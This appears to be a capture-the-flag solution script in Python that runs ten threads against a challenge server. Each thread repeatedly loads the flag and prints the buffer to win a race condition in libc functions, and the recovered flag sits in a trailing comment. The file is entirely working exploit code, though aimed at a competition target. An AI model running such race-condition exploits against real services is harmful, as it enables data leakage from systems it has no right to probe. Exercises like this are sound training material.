#!/usr/bin/env python3

import socket
import threading
import time
import sys
from pwn import *

# Configuration
TARGET_HOST = "07bdaf23-d9f7-40d1-96a3-369cfba7edd5.chall.nnsc.tf"
TARGET_PORT = 41337
NUM_THREADS = 10
FOUND_FLAG = False
flag_result = None
threads_active = []

def exploit_thread(thread_id):
    global FOUND_FLAG, flag_result, threads_active
    
    try:
        print(f"[Thread {thread_id}] Starting exploit attempt...")
        
        # Connect to the remote server
        conn = remote(TARGET_HOST, TARGET_PORT, ssl=True)
        threads_active.append(conn)
        conn.recvuntil(b'> ')
        
        while not FOUND_FLAG:
            try:
                print(f"[Thread {thread_id}] Exploit loop...")
                # Step 1: Load flag (option 2)
                conn.sendline(b'2')
                response = conn.recvuntil(b'> ').decode()
                
                if "Successfully placed flag in buffer" not in response:
                    print(f"[Thread {thread_id}] Failed to load flag")
                    continue
                
                # Step 2: Print buffer (option 3) - this creates the race condition
                conn.sendline(b'3\n1\nAAAA')

                # Check for any output that might contain the flag
                response = conn.recvuntil(b'> ').decode()
                
                if '}' in response:
                    print(f"[Thread {thread_id}] FOUND FLAG!")
                    flag_result = response
                    FOUND_FLAG = True
                    break
                    
                # Small delay before retry
                time.sleep(0.01)
                
            except Exception as e:
                print(f"[Thread {thread_id}] Error during exploit: {e}")
                # Try to reconnect
                try:
                    conn.close()
                    conn = remote(TARGET_HOST, TARGET_PORT, ssl=True)
                    threads_active.append(conn)
                except:
                    break
    
    except Exception as e:
        print(f"[Thread {thread_id}] Connection failed: {e}")
    
    finally:
        try:
            conn.close()
        except:
            pass

def main():
    global FOUND_FLAG, flag_result
    
    print(f"Starting race condition exploit with {NUM_THREADS} threads...")
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
    
    # Create and start all threads
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=exploit_thread, args=(i,))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.01)  # Small delay between thread starts
    
    # Wait for flag or timeout
    start_time = time.time()
    timeout = 360  # 60 seconds timeout
    
    while not FOUND_FLAG and (time.time() - start_time) < timeout:
        time.sleep(0.1)
    
    if FOUND_FLAG:
        print("\n" + "="*50)
        print("FLAG FOUND!")
        print("="*50)
        print(flag_result)
        print("="*50)
    else:
        print("\nTimeout reached. No flag found.")
    
    # Clean up - close all active connections
    print("Cleaning up connections...")
    for conn in threads_active:
        try:
            conn.close()
        except:
            pass
    
    # Force exit
    os._exit(0)

if __name__ == "__main__":
    main()

#NNS{1_7h0u67_l18c_func710n5_w3r3_s4f3_4641n57_r4c3_c0nd1710n5???_4604049fdf10}